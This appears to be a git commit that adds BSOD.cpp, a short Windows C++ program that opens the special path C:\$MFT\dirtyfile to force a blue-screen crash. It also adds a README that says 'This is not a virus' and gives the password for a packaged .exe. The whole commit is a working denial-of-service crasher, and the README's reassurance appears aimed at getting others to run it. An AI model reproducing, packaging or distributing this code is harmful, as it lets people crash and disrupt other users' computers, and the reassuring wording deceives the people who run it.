87fbcfa94a8ea3dc2cd8cf31c885c792552ec4e5
thetranssheir419 <115661078+paradox-gm@users.noreply.github.com>
2023-03-15 15:46:46 +0200

    Add files via upload
    .exe file in BSOD.rar

---
+++ BSOD.cpp
@@ -0,0 +1,21 @@
+﻿#include <windows.h>
+#include <stdio.h>
+#include <tchar.h>
+#include <iostream>
+
+using namespace std;
+
+int main(int argc, _TCHAR* argv[])
+{
+	HANDLE hFile = NULL;
+
+	hFile = CreateFileW(L"C:\\$MFT\\dirtyfile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+	CloseHandle(hFile);
+
+	return 0;
+
+	cout << "BY MVA";
+
+	Sleep(2000);
+}
---
+++ README.txt
@@ -0,0 +1,3 @@
+This is not a virus.
+
+Pass: 419
